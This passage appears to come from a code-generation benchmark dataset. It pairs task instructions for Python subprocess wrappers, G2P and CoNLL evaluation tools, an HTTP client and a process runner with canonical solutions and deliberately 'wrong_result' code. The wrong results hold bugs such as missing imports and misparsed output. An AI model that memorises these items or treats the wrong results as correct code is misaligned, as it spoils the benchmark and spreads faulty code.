    "Instruction": "Task Description: Write a Python function that executes a Perl script (conlleval) via subprocess to evaluate model scores from a given file and returns the accuracy, precision, recall, and F1 score.\n\nFunction Description: The function uses subprocess.PIPE to create a pipe for inter-process communication with a Perl script. It starts the Perl process, feeds it input from a specified file, captures the output, and parses the results to extract evaluation metrics.\n\nInput:\n- path: str - The file path containing the input data to be evaluated by the Perl script\n\nOutput:\n- tuple[float, float, float, float] - A tuple containing four float values representing accuracy, precision, recall, and F1 score in that order",
    "Canonical_solution": "import subprocess\n\ndef scores(path):\n    bashCommand = 'perl conlleval'\n    process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE,\n                               stdin=open(path))\n    output, error = process.communicate()\n    output = output.decode().split('\\n')[1].split('%; ')\n    output = [out.split(' ')[-1] for out in output]\n    acc, prec, recall, fb1 = tuple(output)\n    return float(acc), float(prec), float(recall), float(fb1)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef evaluate_model(path):\n    with open(path, 'r') as f:\n        input_data = f.read()\n    result = subprocess.run(['perl', 'conlleval'], input=input_data, capture_output=True, text=True)\n    output = result.stdout\n    lines = output.splitlines()\n    accuracy = None\n    precision = None\n    recall = None\n    f1 = None\n    for line in lines:\n        if 'Accuracy' in line:\n            accuracy = float(line.split()[-1])\n        elif 'Precision' in line:\n            precision = float(line.split()[-1])\n        elif 'Recall' in line:\n            recall = float(line.split()[-1])\n        elif 'F1' in line:\n            f1 = float(line.split()[-1])\n    return (accuracy, precision, recall, f1)"
  },
  {
    "Task_id": 286,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words into their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model. The class should handle both single words and lists of words, and provide options for retrieving multiple pronunciation candidates.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words to their phonetic pronunciations using a specified FST model. It supports both single-word and batch processing, with optional n-best results.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for G2P conversion.\n- nbest: [int/None] - The number of best pronunciation candidates to return for each word (optional).\n- _logger: [logging.Logger] - Logger instance for debugging and error reporting.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> None - Initializes the G2P converter with the path to the FST model and optional n-best setting.\n- execute(fst_model, input, is_file=False, nbest=None) -> dict - Executes the phonetisaurus-g2p command with the given input and returns the pronunciation results as a dictionary.\n- _translate_word(word) -> dict - Internal method to translate a single word to phonemes.\n- _translate_words(words) -> dict - Internal method to translate a list of words to phonemes using a temporary file.\n- translate(words) -> dict - Main interface method that translates either a single word or a list of words to their phonetic pronunciations.",
    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport tempfile\nimport logging\nimport yaml\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self._logger.debug(\"Using FST model: '%s'\", self.fst_model)\n        self.nbest = nbest\n        if self.nbest is not None:\n            self._logger.debug(\"Will use the %d best results.\", self.nbest)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if nbest is not None:\n            cmd.extend(['--nbest=%d' % nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result\n\n    def _translate_word(self, word):\n        return self.execute(self.fst_model, word, nbest=self.nbest)\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(suffix='.g2p', delete=False) as f:\n            for word in words:\n                f.write(\"%s\\n\" % word)\n            tmp_fname = f.name\n        output = self.execute(self.fst_model, tmp_fname, is_file=True,\n                              nbest=self.nbest)\n        os.remove(tmp_fname)\n        return output\n\n    def translate(self, words):\n        if type(words) is str or len(words) == 1:\n            self._logger.debug('Converting single word to phonemes')\n            output = self._translate_word(words if type(words) is str\n                                          else words[0])\n        else:\n            self._logger.debug('Converting %d words to phonemes', len(words))\n            output = self._translate_words(words)\n        self._logger.debug('G2P conversion returned phonemes for %d words',\n                           len(output))\n        return output",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport logging\nimport tempfile\nimport os\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model=None, nbest=None):\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger(__name__)\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        model_path = self.fst_model\n        cmd = ['phonetisaurus-g2p', '-f', model_path]\n        if nbest is not None:\n            cmd.append('-n')\n            cmd.append(str(nbest))\n        if is_file:\n            cmd.append(input)\n        else:\n            with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmp:\n                tmp.write(input)\n                tmp_path = tmp.name\n            cmd.append(tmp_path)\n        try:\n            result = subprocess.run(cmd, capture_output=True, text=True, check=True)\n            output = result.stdout\n            lines = output.strip().split('\\n')\n            result_dict = {}\n            for line in lines:\n                if line:\n                    parts = line.split(': ')\n                    if len(parts) == 2:\n                        word, phonemes = parts\n                        result_dict[word] = phonemes\n            return result_dict\n        except subprocess.CalledProcessError as e:\n            self._logger.error(\"Error executing phonetisaurus-g2p: %s\", e)\n            return {}\n\n    def _translate_word(self, word):\n        return self.execute(self.fst_model, word, is_file=False, nbest=self.nbest)\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmp:\n            tmp.write('\\n'.join(words))\n            tmp_path = tmp.name\n        return self.execute(self.fst_model, tmp_path, is_file=True, nbest=self.nbest)\n\n    def translate(self, words):\n        if isinstance(words, str):\n            return self._translate_word(words)\n        else:\n            return self._translate_words(words)"
  },
  {
    "Task_id": 288,
    "Instruction": "Task Description: Implement functions to execute system commands and manage subprocesses in Python, allowing for both simple command execution and more controlled process management with input/output handling.\n\nFunction Description: The module provides two main functions for subprocess management: `execute()` for running commands with comprehensive output handling, and `popen()` for creating Popen objects with predefined pipe configurations.\n\nInput:\n- For `execute()`:\n  - cmd: [string/list] - Command to execute (as string or argument list)\n  - shell: [bool, optional] - Whether to use shell execution (default False)\n  - poll_period: [float, optional] - Unused in current implementation\n  - catch_out: [bool, optional] - Whether to capture output (default False)\n  - executable: [string, optional] - Path to executable to use\n  - env: [dict, optional] - Environment variables for subprocess\n\n- For `popen()`:\n  - cmnd: [string] - Command string to execute\n\nOutput:\n- For `execute()`:\n  - Returns tuple: (returncode: int, stdout: bytes/str, stderr: bytes/str)\n  \n- For `popen()`:\n  - Returns: subprocess.Popen object configured with pipes for all streams",
    "Canonical_solution": "import subprocess\nimport shlex\nimport logging\nfrom six import string_types\n\ndef execute(cmd, shell=False, poll_period=1.0, catch_out=False, executable=None, env=None):\n    log = logging.getLogger(__name__)\n    log.info(\"Starting: %s\", cmd)\n\n    stdout = \"\"\n    stderr = \"\"\n\n    if not shell and isinstance(cmd, string_types):\n        cmd = shlex.split(cmd)\n    if not executable:\n        executable = None\n\n    if catch_out:\n        process = subprocess.Popen(\n            cmd,\n            shell=shell,\n            stderr=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            close_fds=True,\n            env=env,\n            executable=executable,\n        )\n    else:\n        process = subprocess.Popen(cmd, shell=shell, close_fds=True, env=env, executable=executable)\n\n    stdout, stderr = process.communicate()\n    if stderr:\n        log.error(\"There were errors:\\n%s\", stderr)\n\n    if stdout:\n        log.debug(\"Process output:\\n%s\", stdout)\n    returncode = process.returncode\n    log.info(\"Process cmd: %s \u2013 exit code: %s\", cmd, returncode)\n    return returncode, stdout, stderr\n\ndef popen(cmnd):\n    return subprocess.Popen(\n        cmnd,\n        bufsize=0,\n        close_fds=True,\n        shell=True,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        stdin=subprocess.PIPE,\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef execute(cmd, shell=False, catch_out=False, executable=None, env=None):\n    if shell:\n        process = subprocess.run(\n            cmd,\n            shell=True,\n            capture_output=catch_out,\n            text=True,\n            executable=executable,\n            env=env\n        )\n    else:\n        process = subprocess.run(\n            cmd,\n            capture_output=catch_out,\n            text=True,\n            executable=executable,\n            env=env\n        )\n    return (process.returncode, process.stdout, process.stderr)\n\ndef popen(cmnd):\n    return subprocess.Popen(\n        cmnd,\n        stdin=subprocess.PIPE,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        universal_newlines=True\n    )"
  },
  {
    "Task_id": 289,
    "Instruction": "Task Description: Implement functions to retrieve clipboard text content on different operating systems using subprocess pipes for inter-process communication.\n\nFunction Description: The functions use system clipboard utilities through subprocess pipes to get text content from the clipboard, handling platform-specific requirements and text encoding conversions.\n\nInput: None (both functions operate on system clipboard content)\n\nOutput: \n- osx_clipboard_get: Returns str - The decoded text content from macOS clipboard with line endings normalized\n- wayland_clipboard_get: Returns str - The decoded text content from Wayland clipboard, or raises exceptions for non-Wayland environments or missing dependencies\n\nMethods:\n1. osx_clipboard_get() -> str - Retrieves clipboard text on macOS using pbpaste command, converts line endings, and decodes the output\n2. wayland_clipboard_get() -> str - Retrieves clipboard text on Wayland using wl-paste command, with environment checks and error handling",
    "Canonical_solution": "import os\nimport subprocess\nimport IPython.utils.py3compat as py3compat\n\ndef osx_clipboard_get() -> str:\n    \"\"\" Get the clipboard's text on OS X.\n    \"\"\"\n    p = subprocess.Popen(['pbpaste', '-Prefer', 'ascii'],\n        stdout=subprocess.PIPE)\n    bytes_, stderr = p.communicate()\n    # Text comes in with old Mac \\r line endings. Change them to \\n.\n    bytes_ = bytes_.replace(b'\\r', b'\\n')\n    text = py3compat.decode(bytes_)\n    return text\n\ndef wayland_clipboard_get():\n    \"\"\"Get the clipboard's text under Wayland using wl-paste command.\n\n    This requires Wayland and wl-clipboard installed and running.\n    \"\"\"\n    if os.environ.get(\"XDG_SESSION_TYPE\") != \"wayland\":\n        raise TryNext(\"wayland is not detected\")\n\n    try:\n        with subprocess.Popen([\"wl-paste\"], stdout=subprocess.PIPE) as p:\n            raw, err = p.communicate()\n            if p.wait():\n                raise TryNext(err)\n    except FileNotFoundError as e:\n        raise TryNext(\n            \"Getting text from the clipboard under Wayland requires the wl-clipboard \"\n            \"extension: https://github.com/bugaevc/wl-clipboard\"\n        ) from e\n\n    if not raw:\n        raise ClipboardEmpty\n\n    try:\n        text = py3compat.decode(raw)\n    except UnicodeDecodeError as e:\n        raise ClipboardEmpty from e\n\n    return text",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport os\n\ndef osx_clipboard_get():\n    result = subprocess.run(['pbpaste'], capture_output=True, text=True, check=True)\n    text = result.stdout.replace('\\r\\n', '\\n')\n    return text\n\ndef wayland_clipboard_get():\n    if os.environ.get('XDG_SESSION_TYPE') != 'wayland':\n        raise RuntimeError(\"Not a Wayland session\")\n    try:\n        result = subprocess.run(['wl-paste'], capture_output=True, text=True, check=True)\n    except subprocess.CalledProcessError as e:\n        raise RuntimeError(\"Failed to get clipboard content\") from e\n    except FileNotFoundError:\n        raise RuntimeError(\"wl-paste not found\") from None\n    text = result.stdout.replace('\\r\\n', '\\n')\n    return text"
  },
  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a robust HTTP client class in Python that handles both HTTP and HTTPS connections, supports proxy configuration, and manages connection timeouts and keep-alive settings.\n\nClass Description: The MNSHttp class provides a wrapper around Python's http.client module to handle HTTP/HTTPS requests with additional features like proxy support, connection timeout management, and keep-alive functionality.\n\nAttributes:\n- host: str - The target server hostname or IP address\n- is_https: bool - Flag indicating whether to use HTTPS (True) or HTTP (False)\n- connection_timeout: int - Connection timeout in seconds (default: 60)\n- keep_alive: bool - Flag for maintaining persistent connections (default: True)\n- request_size: int - Tracks the size of the last request sent\n- response_size: int - Tracks the size of the last response received\n- logger: Logger - Optional logger for debugging information\n- proxy: str - Optional proxy server configuration\n- conn: HTTPConnection/HTTPSConnection - The active connection object\n\nMethods:\n- __init__(host, connection_timeout=60, keep_alive=True, logger=None, is_https=False) -> None - Initializes the HTTP client with connection parameters\n- _new_conn() -> HTTPConnection/HTTPSConnection - Creates a new connection object based on current configuration\n- _basic_auth_str(username, password) -> str - Generates Basic Auth header string\n- get_env_proxy() -> str - Retrieves proxy configuration from environment variables\n- set_connection_timeout(connection_timeout) -> None - Updates the connection timeout and recreates the connection if needed\n- send_request(req_inter) -> ResponseInternal - Sends an HTTP request and returns the response, handling proxy configuration and connection management\n\nHelper Classes:\n- MNSHTTPConnection(host, port=None, strict=None, connection_timeout=60) - Custom HTTP connection with timeout support and request size tracking\n- MNSHTTPSConnection(host, port=None) - Custom HTTPS connection with request size tracking\n\nBoth connection classes extend their respective http.client counterparts and add:\n- request_length tracking\n- Custom connect() implementation for MNSHTTPConnection with timeout support\n- Overridden send() method to track request size\n- Standardized request() method initialization",
    "Canonical_solution": "import base64\nimport socket\nfrom http.client import HTTPConnection, BadStatusLine, HTTPSConnection\nfrom urllib.parse import urlparse, unquote\nimport os\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger\n        self.proxy = None\n        self.conn = self._new_conn()\n        if self.logger:\n            self.logger.info(\"InitMNSHttp KeepAlive:%s ConnectionTime:%s\" % (self.keep_alive, self.connection_timeout))\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host)\n        else:\n            return MNSHTTPConnection(self.host, connection_timeout=self.connection_timeout)\n\n    def _basic_auth_str(self, username, password):\n        if isinstance(username, str):\n            username = username.encode()\n        if isinstance(password, str):\n            password = password.encode()\n        return 'Basic ' + base64.b64encode(b':'.join((username, password))).strip().decode()\n\n    def get_env_proxy(self):\n        if self.is_https:\n            return os.getenv('https_proxy') or os.getenv('HTTPS_PROXY')\n        else:\n            return os.getenv('http_proxy') or os.getenv('HTTP_PROXY')\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if not self.is_https:\n            if self.conn:\n                self.conn.close()\n            self.conn = MNSHTTPConnection(self.host, connection_timeout=connection_timeout)\n\n    def send_request(self, req_inter):\n        try:\n            if self.logger:\n                self.logger.debug(\"SendRequest %s\" % req_inter)\n\n            proxy = self.get_env_proxy()\n            if proxy:\n                url = urlparse(proxy)\n                self.conn.close()\n                if url.username:\n                    req_inter.header['Proxy-Authorization'] = self._basic_auth_str(unquote(url.username), unquote(url.password))\n                if self.is_https:\n                    self.conn = MNSHTTPSConnection(url.hostname, url.port)\n                else:\n                    self.conn = MNSHTTPConnection(url.hostname, url.port, connection_timeout=self.connection_timeout)\n                self.conn.set_tunnel(self.host, headers=req_inter.header)\n            else:\n                if self.conn.host != self.host:\n                    self.conn.close()\n                    self.conn = self._new_conn()\n\n            self.conn.request(req_inter.method, 'http://%s%s' % (self.host, req_inter.uri), req_inter.data, req_inter.header)\n            self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n            try:\n                http_resp = self.conn.getresponse()\n            except BadStatusLine:\n                self.conn.close()\n                self.conn.request(req_inter.method, req_inter.uri, req_inter.data, req_inter.header)\n                self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n                http_resp = self.conn.getresponse()\n            \n            headers = dict(http_resp.getheaders())\n            resp_inter = ResponseInternal(status=http_resp.status, header=headers, data=http_resp.read())\n            self.request_size = self.conn.request_length\n            self.response_size = len(resp_inter.data)\n            \n            if not self.is_keep_alive():\n                self.conn.close()\n            if self.logger:\n                self.logger.debug(\"GetResponse %s\" % resp_inter)\n            return resp_inter\n        except Exception as e:\n            self.conn.close()\n            raise MNSClientNetworkException(\"NetWorkException\", str(e), req_inter.get_req_id())\n\nclass MNSHTTPConnection(HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        HTTPConnection.__init__(self, host, port, strict)\n        self.request_length = 0\n        self.connection_timeout = connection_timeout\n\n    def send(self, str):\n        HTTPConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPConnection.request(self, method, url, body, headers)\n\n    def connect(self):\n        msg = \"getaddrinfo returns an empty list\"\n        for res in socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM):\n            af, socktype, proto, canonname, sa = res\n            try:\n                self.sock = socket.socket(af, socktype, proto)\n                self.sock.settimeout(self.connection_timeout)\n                self.sock.connect(sa)\n            except socket.error as msg:\n                if self.sock:\n                    self.sock.close()\n                self.sock = None\n                continue\n            break\n        if not self.sock:\n            raise socket.error(msg)\n\nclass MNSHTTPSConnection(HTTPSConnection):\n    def __init__(self, host, port=None):\n        HTTPSConnection.__init__(self, host, port)\n        self.request_length = 0\n\n    def send(self, str):\n        HTTPSConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPSConnection.request(self, method, url, body, headers)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "class MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.logger = logger\n        self.proxy = self.get_env_proxy()\n        self.conn = None\n        self.request_size = 0\n        self.response_size = 0\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host, connection_timeout=self.connection_timeout)\n        else:\n            return MNSHTTPConnection(self.host, connection_timeout=self.connection_timeout)\n\n    def _basic_auth_str(self, username, password):\n        return base64.b64encode(f\"{username}:{password}\".encode()).decode()\n\n    def get_env_proxy(self):\n        return os.getenv('HTTP_PROXY') or os.getenv('HTTPS_PROXY')\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if self.conn:\n            self.conn.close()\n            self.conn = self._new_conn()\n\n    def send_request(self, req_inter):\n        if self.proxy:\n            pass\n        self.conn = self._new_conn()\n        self.conn.request(req_inter.method, req_inter.path, req_inter.body, req_inter.headers)\n        resp = self.conn.getresponse()\n        self.request_size = len(req_inter.body)\n        self.response_size = len(resp.read())\n        return ResponseInternal(resp.status, resp.reason, resp.read())\n\nclass MNSHTTPConnection(http.client.HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        super().__init__(host, port, strict)\n        self.connection_timeout = connection_timeout\n        self.request_length = 0\n\n    def connect(self):\n        super().connect()\n        self.sock.settimeout(self.connection_timeout)\n\n    def send(self, data):\n        self.request_length = len(data)\n        super().send(data)\n\n    def request(self, method, path, body=None, headers=None):\n        super().request(method, path, body, headers)\n\nclass MNSHTTPSConnection(http.client.HTTPSConnection):\n    def __init__(self, host, port=None, connection_timeout=60):\n        super().__init__(host, port)\n        self.connection_timeout = connection_timeout\n        self.request_length = 0\n\n    def connect(self):\n        super().connect()\n        self.sock.settimeout(self.connection_timeout)\n\n    def send(self, data):\n        self.request_length = len(data)\n        super().send(data)\n\n    def request(self, method, path, body=None, headers=None):\n        super().request(method, path, body, headers)\n\nclass ResponseInternal:\n    def __init__(self, status, reason, content):\n        self.status = status\n        self.reason = reason\n        self.content = content"
  },
  {
    "Task_id": 290,
    "Instruction": "Task Description: Implement a class that interfaces with the Phonetisaurus G2P (Grapheme-to-Phoneme) tool to convert words to their phonetic pronunciations using a pre-trained FST (Finite State Transducer) model.\n\nClass Description: The PhonetisaurusG2P class provides an interface to the Phonetisaurus G2P tool, allowing for the conversion of words or files containing words to their phonetic pronunciations. It handles process execution, error logging, and output parsing.\n\nAttributes:\n- fst_model: [str] - The file path to the pre-trained FST model used for grapheme-to-phoneme conversion.\n- nbest: [int/None] - The number of best pronunciations to return for each word. If None, only the top pronunciation is returned.\n- _logger: [logging.Logger] - A logger instance for debugging and error logging.\n\nMethods:\n- __init__(fst_model=None, nbest=None) -> [None] - Initializes the PhonetisaurusG2P instance with the path to the FST model and the number of best pronunciations to return.\n  - Input Parameters:\n    - fst_model: [str] - Path to the FST model file.\n    - nbest: [int/None] - Number of best pronunciations to return (default: None).\n  - Return Type: None\n\n- execute(input, is_file=False) -> [dict] - Executes the Phonetisaurus G2P tool to convert the input word or file to phonetic pronunciations.\n  - Input Parameters:\n    - input: [str] - The input word or file path containing words to be converted.\n    - is_file: [bool] - Flag indicating whether the input is a file (default: False).\n  - Return Type: dict - A dictionary where keys are words and values are lists of pronunciations. Each pronunciation is a string.\n  - Description: This method uses subprocess.Popen to run the Phonetisaurus G2P tool, captures stdout and stderr, parses the output, and returns the results in a structured format. Errors are logged, and exceptions are raised for execution failures.",
    "Canonical_solution": "import os\nimport re\nimport subprocess\nimport logging\n\nclass PhonetisaurusG2P:\n    PATTERN = re.compile(r'^(?P<word>.+)\\t(?P<precision>\\d+\\.\\d+)\\t<s> ' +\n                         r'(?P<pronounciation>.*) </s>', re.MULTILINE)\n\n    def __init__(self, fst_model=None, nbest=None):\n        self._logger = logging.getLogger(__name__)\n        self.fst_model = os.path.abspath(fst_model)\n        self.nbest = nbest\n\n    def execute(self, input, is_file=False):\n        cmd = ['phonetisaurus-g2p',\n               '--model=%s' % self.fst_model,\n               '--input=%s' % input,\n               '--words']\n\n        if is_file:\n            cmd.append('--isfile')\n\n        if self.nbest is not None:\n            cmd.extend(['--nbest=%d' % self.nbest])\n\n        cmd = [str(x) for x in cmd]\n        try:\n            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            stdoutdata, stderrdata = proc.communicate()\n        except OSError:\n            self._logger.error(\"Error occured while executing command '%s'\",\n                             ' '.join(cmd), exc_info=True)\n            raise\n\n        if stderrdata:\n            for line in stderrdata.splitlines():\n                message = line.strip()\n                if message:\n                    self._logger.debug(message)\n\n        if proc.returncode != 0:\n            self._logger.error(\"Command '%s' return with exit status %d\",\n                             ' '.join(cmd), proc.returncode)\n            raise OSError(\"Command execution failed\")\n\n        result = {}\n        if stdoutdata is not None:\n            for word, precision, pronounc in self.PATTERN.findall(stdoutdata):\n                if word not in result:\n                    result[word] = []\n                result[word].append(pronounc)\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport logging\nimport shlex\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model=None, nbest=None):\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger('PhonetisaurusG2P')\n\n    def execute(self, input, is_file=False):\n        cmd = ['phonetisaurus', '-f', self.fst_model]\n        if self.nbest is not None:\n            cmd.append('--nbest')\n            cmd.append(str(self.nbest))\n        if is_file:\n            cmd.append('-i')\n            cmd.append(input)\n        else:\n            cmd.append('-i')\n            cmd.append('-')\n        cmd.append('-o')\n        cmd.append('/dev/stdout')\n\n        process = subprocess.Popen(\n            cmd,\n            stdin=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True\n        )\n\n        if is_file:\n            with open(input, 'r') as f:\n                input_data = f.read()\n        else:\n            input_data = input\n\n        stdout, stderr = process.communicate(input=input_data)\n\n        if process.returncode != 0:\n            self._logger.error(f\"Error running phonetisaurus: {stderr}\")\n            raise RuntimeError(f\"Error running phonetisaurus: {stderr}\")\n\n        result = {}\n        for line in stdout.strip().split('\\n'):\n            if not line:\n                continue\n            parts = line.split()\n            if not parts:\n                continue\n            word = parts[0]\n            pronunciations = parts[1:]\n            result[word] = pronunciations\n\n        return result"
  },
  {
    "Task_id": 291,
    "Instruction": "Task Description: Implement a function that evaluates coreference resolution results using the official CoNLL-2012 evaluation script, parsing and returning the recall, precision, and F1 scores.\n\nFunction Description: The function `official_conll_eval` executes the official CoNLL-2012 evaluation script as a subprocess, captures its output, and parses the recall, precision, and F1 scores from the output. It can optionally log the official output for debugging or reporting purposes.\n\nInput:\n- `gold_path` (str): Path to the file containing gold-standard coreference annotations.\n- `predicted_path` (str): Path to the file containing predicted coreference annotations.\n- `metric` (str): The evaluation metric to compute (e.g., \"muc\", \"bcub\", \"ceafe\").\n- `official_stdout` (bool, optional): If True, logs the official evaluation script output. Defaults to True.\n\nOutput:\n- Returns a dictionary with the following keys:\n  - \"r\" (float): Recall score in percentage.\n  - \"p\" (float): Precision score in percentage.\n  - \"f\" (float): F1 score in percentage.",
    "Canonical_solution": "import re\nimport subprocess\nimport logging\n\nlogger = logging.getLogger(__name__)\nCOREF_RESULTS_REGEX = re.compile(r\".*Coreference: Recall: \\([0-9.]+ / [0-9.]+\\) ([0-9.]+)%\\tPrecision: \\([0-9.]+ / [0-9.]+\\) ([0-9.]+)%\\tF1: ([0-9.]+)%.*\", re.DOTALL)\n\ndef official_conll_eval(gold_path, predicted_path, metric, official_stdout=True):\n    cmd = [\"conll-2012/scorer/v8.01/scorer.pl\", metric, gold_path, predicted_path, \"none\"]\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE)\n    stdout, stderr = process.communicate()\n    process.wait()\n\n    stdout = stdout.decode(\"utf-8\")\n    if stderr is not None:\n        logger.error(stderr)\n\n    if official_stdout:\n        logger.info(\"Official result for {}\".format(metric))\n        logger.info(stdout)\n\n    coref_results_match = re.match(COREF_RESULTS_REGEX, stdout)\n    recall = float(coref_results_match.group(1))\n    precision = float(coref_results_match.group(2))\n    f1 = float(coref_results_match.group(3))\n    return {\"r\": recall, \"p\": precision, \"f\": f1}",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport re\n\ndef official_conll_eval(gold_path, predicted_path, metric, official_stdout=True):\n    cmd = ['python', 'conlleval.py', '-m', metric, '-g', gold_path, '-p', predicted_path]\n    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n    if result.returncode != 0:\n        raise RuntimeError(f\"Evaluation failed: {result.stderr}\")\n    if official_stdout:\n        print(result.stdout)\n    output = result.stdout\n    precision = None\n    recall = None\n    f1 = None\n    for line in output.splitlines():\n        if 'Precision' in line:\n            precision = float(line.split(':')[-1].strip())\n        elif 'Recall' in line:\n            recall = float(line.split(':')[-1].strip())\n        elif 'F1' in line:\n            f1 = float(line.split(':')[-1].strip())\n    return {\n        'r': round(recall * 100, 2) if recall is not None else 0.0,\n        'p': round(precision * 100, 2) if precision is not None else 0.0,\n        'f': round(f1 * 100, 2) if f1 is not None else 0.0\n    }"
  },
  {
    "Task_id": 292,
    "Instruction": "Task Description: Create a Python class that facilitates executing system commands with options for streaming output, sudo execution, and handling both string and list-based commands.\n\nClass Description: The ProcessRunner class provides a flexible way to execute system commands with various configurations. It handles command execution with options for streaming output in real-time, sudo privileges, and supports both string and list-formatted commands. The class manages subprocess creation, output capture, error handling, and return code collection.\n\nAttributes:\n- None (This class doesn't maintain persistent attributes between method calls)\n\nMethods:\n- _read_output(pipe, q) -> None - Private method that continuously reads from a pipe and puts data into a queue for output streaming.\n- _stream_output(comm, shell) -> tuple - Executes a command with streaming output capability, returns (stdout, stderr, returncode).\n- _decode(value) -> str - Helper method to decode byte strings to unicode (Python 3 compatibility).\n- _run_command(comm, shell) -> tuple - Executes a command and returns output after completion, returns (stdout, stderr, returncode).\n- execute(command_list, leave_on_fail) -> tuple/list - Main interface for command execution, handles multiple commands with various options. Returns single result tuple or list of tuples depending on input.\n\nInput Parameters:\n- For execute():\n  - command_list: dict/list - Either a single command dictionary or list of command dictionaries\n  - leave_on_fail: bool - Whether to stop execution if a command fails (default: False)\n- Command dictionary structure:\n  - args: list/str - The command to execute (either as list or string)\n  - shell: bool - Whether to use shell execution (default: False)\n  - stream: bool - Whether to stream output in real-time (default: False)\n  - sudo: bool - Whether to execute with sudo (default: False)\n\nOutput:\n- For single command: tuple (stdout_output, stderr_output, return_code)\n- For multiple commands: list of tuples [(stdout, stderr, returncode), ...]\n- On error: tuple (\"\", \"Command not found!\", 1)",
